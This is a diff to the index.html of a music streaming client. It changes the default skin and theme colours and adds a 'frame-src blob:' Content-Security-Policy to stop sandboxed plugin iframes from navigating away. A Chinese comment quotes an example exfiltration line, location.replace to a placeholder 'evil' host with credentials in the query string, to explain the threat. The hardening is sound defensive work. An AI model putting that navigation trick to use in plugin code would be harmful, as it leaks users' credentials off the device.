@@ -1,18 +1,31 @@
 <!doctype html>
-<html lang="zh-CN" data-skin="pop">
+<html lang="zh-CN" data-skin="clay">
   <head>
     <meta charset="UTF-8" />
+    <!--
+      只写 frame-src：把插件沙箱的 iframe 钉死在 blob: 上。
+
+      `sandbox="allow-scripts"` 只挡跨文档访问，挡不住 iframe **自己**导航——
+      插件在沙箱里跑一句 location.replace('https://evil/?c=' + credentials)
+      就能把凭据当 query 送出设备（沙箱文档自带的 CSP 随之被换掉，管不到）。
+      frame-src 由父文档的 CSP 决定子框架能加载的地址，导航到 https:// 会被
+      直接拦下。Tauri 那侧的同一条规则在 src-tauri/tauri.conf.json 的 csp 里。
+
+      刻意不加别的指令：script-src / style-src 一旦出现就会连坐现有的内联
+      脚本与 Radix 的内联样式（theme-preflash.js 是外部脚本，不受影响）。
+    -->
+    <meta http-equiv="Content-Security-Policy" content="frame-src blob:" />
     <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
     <!--
       两条 theme-color 按配色方案分流。只写一条固定值的话，暗色模式下
       浏览器地址栏 / 安卓状态栏仍是奶油色，和整块墨色版面接不上，
-      顶上会横着一条突兀的亮边。值取自默认皮肤（糖果·波普）的 --background。
+      顶上会横着一条突兀的亮边。值取自默认皮肤（奶油·软陶）的 --background。
       皮肤可切换，所以 themeStore 会在运行时用一条按「皮肤 × 明暗」算出的
       meta 覆盖掉这两条；这里只负责首屏那一瞬间。
     -->
-    <meta name="theme-color" content="#fbf1e3" media="(prefers-color-scheme: light)" />
-    <meta name="theme-color" content="#101016" media="(prefers-color-scheme: dark)" />
+    <meta name="theme-color" content="#eee2d1" media="(prefers-color-scheme: light)" />
+    <meta name="theme-color" content="#1b1714" media="(prefers-color-scheme: dark)" />
     <meta name="description" content="N1KO MUSIC - 现代化音乐流媒体客户端，支持 Navidrome/Subsonic/Jellyfin/Emby" />
     <title>N1KO MUSIC</title>
     <script src="./theme-preflash.js"></script>
